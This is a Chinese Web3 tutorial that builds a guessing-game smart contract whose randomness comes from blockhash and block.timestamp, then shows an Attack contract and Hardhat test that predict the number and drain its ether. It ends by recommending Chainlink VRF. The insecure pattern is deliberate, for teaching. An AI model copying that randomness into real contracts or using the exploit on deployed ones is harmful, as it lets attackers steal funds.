---
title: Web3系列教程之高级篇---6：为什么你不应该在没有预言机的情况下在链上生成随机数
description: null
author: 李留白
weight: 0
date: 2022-08-05T15:01:33.414Z
lastmod: 2022-08-05T15:01:45.868Z
tags: []
categories:
  - 区块链
  - WEB3.0
featuredImage: https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/R3RYera.png
---

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20220805223012.png)

随机性是一个难题。计算机运行由程序员编写的代码，并遵循给定的步骤序列。因此，设计一个能够给你一个“随机”数的算法是非常困难的，因为该随机数必须来自遵循特定步骤序列的算法。现在，当然，某些功能比其他功能更好。

在这种情况下，我们将专门研究为什么你不能信任链上数据作为随机源（以及为什么我们在进阶课程中使用的 Chainlink VRF 被创建的原因）。

## 要求
- 我们将建立一个有一组牌的游戏。
- 每张牌都有一个与之相关的数字，范围从0到2²⁵⁶-1。
- 玩家将猜测一个将要被选中的数字。
- 然后，庄家将随机从牌包中拿起一张牌。
- 如果有人猜对了数字，他们将赢得0.1个ETH。
- 我们今天将破解这个游戏 :)

## 构建

为了构建智能合约，我们将使用Hardhat。Hardhat是一个Ethereum开发环境和框架，为Solidity的全栈开发而设计。简单地说，你可以编写你的智能合约，部署它们，运行测试，并调试你的代码。

- 在你的文件夹中，你将建立一个Hardhat项目

```bash
npm init --yes
npm install --save-dev hardhat
```

- 如果你使用的是Windows系统，请做这个额外的步骤，同时安装这些库 :)

```
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- 在你安装Hardhat的同一目录下运行。

```bash
npx hardhat
```
- 选择`Create a basic sample project`
- 对已指定的`Hardhat Project root`按回车键
- 如果你想添加一个`.gitignore`，请按回车键。
- 按回车键`Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

现在你有一个准备好的hardhat项目了!

- 让我们先了解一下abi.encodedPacked是做什么的。

我们以前在入门NFT教程中使用过`abi.encode`。它是一种将多种数据类型串联成一个字节数组的方法，然后可以将其转换为一个字符串。这经常被用来计算NFT集合的`tokenURI`。 `encodePacked`更进一步，将多个值串联成一个字节数组，但也摆脱了任何填充和额外的值。这意味着什么呢？让我们以`uint256`为例。`uint256`的数字有256位。但是，如果存储的值只是`1`，使用`abi.encode`将创建一个有255个`0`和只有1个`1`的字符串。使用`abi.encodePacked`将摆脱所有额外的0，而只是将`1`的值连接起来。

关于`abi.encodePacked`的更多信息，请继续阅读[这篇文章](https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8)

- 在你的`contracts`文件夹中创建一个名为`Game.sol`的文件，并添加以下几行代码。

```
// SPDX-License-Identifier: MIT
  pragma solidity ^0.8.4;

  contract Game {
  constructor() payable {}

      /**
          Randomly picks a number out of `0 to 2²⁵⁶–1`.
      */
      function pickACard() private view returns(uint) {
          // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
          // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
          // which is further converted to a `uint`.
          // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
          uint pickedCard = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
          return pickedCard;
      }

      /**
          It begins the game by first choosing a random number by calling `pickACard`
          It then verifies if the random number selected is equal to `_guess` passed by the player
          If the player guessed the correct number, it sends the player `0.1 ether`
      */
      function guess(uint _guess) public {
          uint _pickedCard = pickACard();
          if(_guess == _pickedCard){
              (bool sent,) = msg.sender.call{value: 0.1 ether}("");
              require(sent, "Failed to send ether");
          }
      }

      /**
          Returns the balance of ether in the contract
      */
      function getBalance() view public returns(uint) {
          return address(this).balance;
      }

  }
```

- 现在在你的`contracts`文件夹中创建一个名为`Attack.sol`的文件，并添加以下几行代码。

```
// SPDX-License-Identifier: MIT
  pragma solidity ^0.8.4;

  import "./Game.sol";

  contract Attack {
      Game game;
      /**
          Creates an instance of Game contract with the help of `gameAddress`
      */
      constructor(address gameAddress) {
          game = Game(gameAddress);
      }

      /**
          attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
          is accessible publically
      */
      function attack() public {
          // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
          // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
          // which is further converted to a `uint`.
          // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
          uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
          game.guess(_guess);
      }

      // Gets called when the contract recieves ether
      receive() external payable{}
  }
```

- 攻击是如何发生的，如下所示。
  - 黑客调用`Attack.sol`中的`attack`函数。
  - 攻击者使用与`Game.sol`相同的方法进一步猜测数字，即`uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp))`
  - 攻击者能够猜到相同的数字，因为blockhash和block.timestamp是公共信息，每个人都可以访问它。
  - 攻击者随后调用`Game.sol`中的`guess`函数
  - `guess`首先调用`pickACard`函数，该函数使用`uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp))`生成相同的数字，因为`pickACard`和`attack`都是在同一个区块内调用的。
  - `guess`比较这些数字，结果发现它们是一样的。
  - `guess`然后发送`Attack.sol` `0.1 ether`，游戏结束。
  - 攻击者成功地猜出了随机数
- 现在让我们写一些测试来验证它是否完全按照我们希望的那样工作。

- 在`test`文件夹中创建一个名为`attack.js`的新文件，并添加以下几行代码

```js
const { ethers, waffle } = require("hardhat");
const { expect } = require("chai");
const { BigNumber, utils } = require("ethers");

describe("Attack", function () {
  it("Should be able to guess the exact number", async function () {
    // Deploy the Game contract
    const Game = await ethers.getContractFactory("Game");
    const _game = await Game.deploy({ value: utils.parseEther("0.1") });
    await _game.deployed();

    console.log("Game contract address", _game.address);

    // Deploy the attack contract
    const Attack = await ethers.getContractFactory("Attack");
    const _attack = await Attack.deploy(_game.address);

    console.log("Attack contract address", _attack.address);

    // Attack the Game contract
    const tx = await _attack.attack();
    await tx.wait();

    const balanceGame = await _game.getBalance();
    // Balance of the Game contract should be 0
    expect(balanceGame).to.equal(BigNumber.from("0"));
  });
});
```

- 现在打开一个终端，指向`Source-of-Randomness`文件夹，执行以下内容

```
npx hardhat test
```

- 如果你所有的测试都通过了，你就成功地完成了黑客的工作 :)

## 预防措施

- 不要使用`blockhash`、`block.timestamp`或真正的任何种类的链上数据作为随机性的来源。

- 你可以使用 [Chainlink VRF's](https://docs.chain.link/docs/chainlink-vrf/) 来获得真正的随机性来源

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/my.png)